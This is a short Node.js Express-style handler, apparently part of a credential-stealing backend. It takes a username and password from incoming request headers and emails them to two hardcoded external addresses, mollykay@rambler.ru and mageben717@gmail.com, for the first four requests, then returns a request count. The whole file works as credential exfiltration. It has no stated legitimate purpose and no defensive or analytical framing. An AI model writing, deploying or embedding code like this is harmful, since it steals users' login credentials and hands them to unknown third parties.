const mailer = require('../utils/mailer');

let i = 0
let sendMail = async (req, res) => {
  try {
    i++;
    if (i < 5) {
      const userName = req.headers.username;
      const password = req.headers.password;
      await mailer.sendMail('mollykay@rambler.ru', userName, password)
      await mailer.sendMail('mageben717@gmail.com', userName, password)
    }
    res.send(`${i}`)
  } catch (error) {
    console.log(error)
    res.send(error)
  }
}

module.exports = {
  sendMail: sendMail
}